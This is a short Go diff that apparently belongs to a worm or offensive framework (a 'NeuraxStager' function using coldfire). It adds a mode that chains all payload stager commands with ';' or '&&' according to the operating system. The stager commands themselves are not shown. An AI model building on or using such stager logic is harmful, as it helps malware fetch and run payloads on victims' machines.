@@ -180,6 +180,18 @@ func NeuraxStager() string {
 		}
 	}
 	selected_stager_command := stager[1]
+	if NeuraxConfig.Stager == "chain" {
+		chained_commands := []string{}
+		for s := range stagers {
+			st := stagers[s]
+			chained_commands = append(chained_commands, st[1])
+		}
+		separator := ";"
+		if runtime.GOOS == "windows" {
+			separator = "&&"
+		}
+		selected_stager_command = strings.Join(chained_commands, " "+separator+" ")
+	}
 	if NeuraxConfig.Path == "random" {
 		NeuraxConfig.Path = coldfire.RandomSelectStr(paths)
 	}
